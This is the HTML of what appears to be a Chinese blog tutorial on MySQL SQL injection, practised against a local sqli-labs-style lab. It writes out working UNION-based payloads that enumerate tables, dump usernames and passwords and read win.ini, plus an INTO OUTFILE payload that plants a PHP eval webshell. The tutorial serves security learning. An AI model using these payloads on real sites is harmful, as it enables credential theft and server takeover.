            "content_html": "<p>对 mysql 不了解的不会语句的去看数据库篇</p>\n<p>mysql15 以后默认存放一个 infomation_schema 里面 这个库里面有很多表 重点是这三个表 columns 、tables、schemata 表字段 CHEMA_NAME 记录着库的信息</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero1.png\" alt=\"\"></p>\n<p>tables 表字段 TABLE_SCHEMA 、TABLE_NAME 分别记录着库名和表名</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero2.png\" alt=\"\"></p>\n<p>columns 存储该用户创建的所有数据库的库名、标名和字段名</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero3.png\" alt=\"\"></p>\n<p>查询 admin 库中所有表字段</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero4.png\" alt=\"\"></p>\n<p>查询某个库某个表的字段可以这样查询</p>\n<p>select * from information_schema.COLUMNS where TABLE_SCHEMA=‘admin’ and</p>\n<p>TABLE_NAME=‘admin’</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero5.png\" alt=\"\"></p>\n<p><strong>2.sql 注入原理</strong></p>\n<p>SQL 注入漏洞的产生需要满足以下两个条件  参数用户可控：从前端传给后端的参数内容是用户可以控制的  参数带入数据库查询：传入的参数拼接到 SQL 语句，且带入数据库查询。</p>\n<p>当用户传入参数为 1’的时候，在数据库执行如下所示。</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' 此 SQL 语句不符合语法规则就会报错。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>You have an error in your SQL syntax; check the manual that corresponds</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>to your MySQL server version for the right syntax to use near '''</span> at line <span class=\"token number\">1</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>当用户传入参数为 <span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> 时 <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> 因为 <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> 为真</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token number\">1</span> 也是真 <span class=\"token operator\">and</span> 两边均为真 所以页面会返回 id<span class=\"token operator\">=</span><span class=\"token number\">1</span> 的结果。 如果用户传入参数为 <span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span> 时</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>因为 <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span> 为假 id<span class=\"token operator\">=</span><span class=\"token number\">1</span> 为真 <span class=\"token operator\">and</span> 两边有一个为假，所以页面返回与 id<span class=\"token operator\">=</span><span class=\"token number\">1</span> 不一样的结果。</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>由此可以初步判断存在 <span class=\"token keyword\">SQL</span> 注入漏洞，攻击者可以进一步拼接  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token string\">'1'</span> <span class=\"token operator\">or</span> <span class=\"token string\">'1'</span> <span class=\"token operator\">=</span> <span class=\"token string\">'1'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token string\">\"1\"</span> <span class=\"token operator\">or</span> <span class=\"token string\">\"1\"</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"1\"</span></pre></td></tr></table></figure><p>判断页面是否不一样，还有无回显的情况输入语句页面没有变化但实际上执行了这种还有延时注入给拼接语句时 sleep 5 看页面是不是 5 秒后显示的</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">sql</span>注释符</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token comment\"># 单行注释 url 编码 %23</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*  */</span> 多行注释 <span class=\"token comment\">/**/</span>当空格用</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">--\"空格\" 单行注释</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">--+ 也可以</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>是否存在注入判断注入的类型是什么</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>判断字段数 <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>确定回显点 <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>查询数据库信息 @<span class=\"token variable\">@version</span> @<span class=\"token variable\">@datadir</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>查询用户名，数据库名 <span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>文件读取 <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'C:\\\\wondows\\\\win.ini'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>写入 webshell <span class=\"token keyword\">select</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>补充一点，使用 <span class=\"token keyword\">sql</span> 注入遇到转义字符串的单引号或者双引号，可使用 HEX 编码绕过</pre></td></tr></table></figure><p><strong>5. 注入类型</strong></p>\n<p>SQL 注入分类：按 SQLMap 中的分类来看，SQL 注入类型有以下 5 种：</p>\n<p>UNION query SQL injection（可联合查询注入）</p>\n<p>Stacked queries SQL injection（可多语句查询注入）</p>\n<p>堆叠查询 Boolean-based blind SQL injection（布尔型注入）</p>\n<p>Error-based SQL injection（报错型注入）</p>\n<p>Time-based blind SQL injection（基于时间延迟注入）</p>\n<p><strong>6. 接受请求类型区分</strong></p>\n<p>GET 注入</p>\n<p>GET 请求的参数是放在 URL 里的，GET 请求的 URL 传参有长度限制 中文需要 URL 编码</p>\n<p>POST 注入 POST 请求参数是放在请求 body 里的，长度没有限制</p>\n<p>COOKIE 注入 cookie 参数放在请求头信息，提交的时候 服务器会从请求头获取</p>\n<p><strong>注入数据类型的区分</strong></p>\n<p>int 整型 select * from users where id=1 sting</p>\n<p>字符型 select * from users where username=‘admin’ like</p>\n<p>搜索型 select * from news where title like ‘% 标题 %’</p>\n<p><strong>union select 联合注入</strong></p>\n<p>1, 判断 [<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcWwuY24vTGVzcy0xLz9pZD0=\">http://www.sql.cn/Less-1/?id=</span>](<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcWwuY24vTGVzcy0xLz9pZD0tNA==\">http://www.sql.cn/Less-1/?id=-4</span>’ union select 1,2,3 %23)1’ and 1=1 %23</p>\n<p>[<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcWwuY24vTGVzcy0xLz9pZD0=\">http://www.sql.cn/Less-1/?id=</span>](<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcWwuY24vTGVzcy0xLz9pZD0tNA==\">http://www.sql.cn/Less-1/?id=-4</span>’ union select 1,2,3 %23)1’ and 1=2 %23</p>\n<p>报错存在注入</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero6.png\" alt=\"\"></p>\n<p>2, 查字段</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' order by 1 %23  --返回正常</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>?id=1'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> <span class=\"token number\">2</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span>  <span class=\"token comment\">-- 返回正常</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' order by 3 %23  --返回正常</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>?id=1'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> <span class=\"token number\">4</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span>  <span class=\"token comment\">-- 返回错误</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>三个字段</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero7.png\" alt=\"\"></p>\n<p><strong>利用 union 联合查询收集信息</strong></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string\">' union select 1,2,3 %23</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>#看哪个字段可以显示信息，利用它获取数据库信息</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>获取数据库信息</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>?id=-1'</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>concat_ws<span class=\"token punctuation\">(</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>@<span class=\"token variable\">@datadir</span><span class=\"token punctuation\">,</span>@<span class=\"token variable\">@version_compile_os</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>databaes<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#获取数据库用户名</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#获取数据库版本</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>@<span class=\"token variable\">@datadir</span> <span class=\"token comment\">#获取数据库路径</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>@<span class=\"token variable\">@version_conpile_os</span> <span class=\"token comment\">#获取操作系统版本</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Your Login name:</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span>' <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>security <span class=\"token comment\">#数据库名</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>（<span class=\"token number\">5.7</span><span class=\"token number\">.26</span>） <span class=\"token comment\">#数据库版本</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>（root<span class=\"token variable\">@localhost</span>） <span class=\"token comment\">#数据库用户名</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>（D:\\Everyday<span class=\"token operator\">-</span>tools\\phpstudy_pro\\Extensions\\MySQL5<span class=\"token punctuation\">.</span><span class=\"token number\">7.26</span>\\<span class=\"token keyword\">data</span>\\root<span class=\"token variable\">@localhost</span>）<span class=\"token comment\">#数据库路径</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>Win64 <span class=\"token comment\">#操作系统版本</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>Your Password:<span class=\"token number\">3</span></pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero8.png\" alt=\"\"></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string\">' union select 1,2,table_name from information_schema.tables where table_schema='</span>security<span class=\"token string\">' limit 0,1 %23</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>#查询单个 改变limit 0,1 前面的数即可查询其他表例如 limit 1,1 limit 2,1</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>另一种查询全部</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>?id=-1'</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>group_concat <span class=\"token comment\">#分组查询结果，隔开</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>emails<span class=\"token punctuation\">,</span>referers<span class=\"token punctuation\">,</span>uagents<span class=\"token punctuation\">,</span>users</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero9.png\" alt=\"\"></p>\n<p><strong>4, 查列名</strong></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string\">' union select 1,2,group_concat(column_name ) from information_schema.columns where table_schema=database() and table_name = \"users\" %23</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Your Login name:2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Your Password:id,username,password #列名</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>?id=-1'</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span>password <span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> users <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#查询 users 表里的 username 和 password</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Your Login name:<span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Your Password:DumbDumb<span class=\"token punctuation\">,</span>AngelinaI<span class=\"token operator\">-</span><span class=\"token keyword\">kill</span><span class=\"token operator\">-</span>you<span class=\"token punctuation\">,</span>Dummyp<span class=\"token variable\">@ssword</span><span class=\"token punctuation\">,</span>securecrappy<span class=\"token punctuation\">,</span>stupidstupidity<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>supermangenious<span class=\"token punctuation\">,</span>batmanmob<span class=\"token operator\">!</span>le<span class=\"token punctuation\">,</span>adminadmin<span class=\"token punctuation\">,</span>admin1admin1<span class=\"token punctuation\">,</span>admin2admin2<span class=\"token punctuation\">,</span>admin3admin3<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>dhakkandumbo<span class=\"token punctuation\">,</span>admin4admin4</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero10.png\" alt=\"\"></p>\n<p><strong>写 webshell</strong></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>三个条件：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">1.</span>具有root权限。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">2.</span>在数据库配置文件中的 配置项含有：secure_file_priv<span class=\"token operator\">=</span><span class=\"token string\">''</span>。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>（注意在数据库中此项默认为secure_file_priv<span class=\"token operator\">=</span><span class=\"token boolean\">null</span>）。</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>secure_file_prive<span class=\"token operator\">=</span><span class=\"token boolean\">null</span> <span class=\"token comment\">// 限制 mysqld 不允许导入导出</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>secure_file_priv<span class=\"token operator\">=</span><span class=\"token operator\">/</span>path<span class=\"token operator\">/</span>  <span class=\"token comment\">// 限制 mysqld 的导入导出只能发生在默认的 /path/ 目录下</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>secure_file_priv<span class=\"token operator\">=</span>’’  <span class=\"token comment\">// 不对 mysqld 的导入 导出做限制</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">3.</span>知道数据库的绝对路径。</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">outfile</span>函数可以导出多行，而<span class=\"token keyword\">dumpfile</span>只能导出一行数据</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">outfile</span>函数在将数据写到文件里时有特殊的格式转换，而<span class=\"token keyword\">dumpfile</span>则保持原数据格式</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' union select 1,\"&lt;?php @eval($_POST['</span>cmd'<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>?<span class=\"token operator\">></span><span class=\"token string\">\",3 into outfile \"</span>D:\\\\Everyday<span class=\"token operator\">-</span>tools\\\\phpstudy_pro\\\\WWW\\\\www<span class=\"token punctuation\">.</span><span class=\"token keyword\">sql</span><span class=\"token punctuation\">.</span>cn\\\\shell8<span class=\"token punctuation\">.</span>php\" <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr></table></figure>",
            "tags": []
        }
    ]
}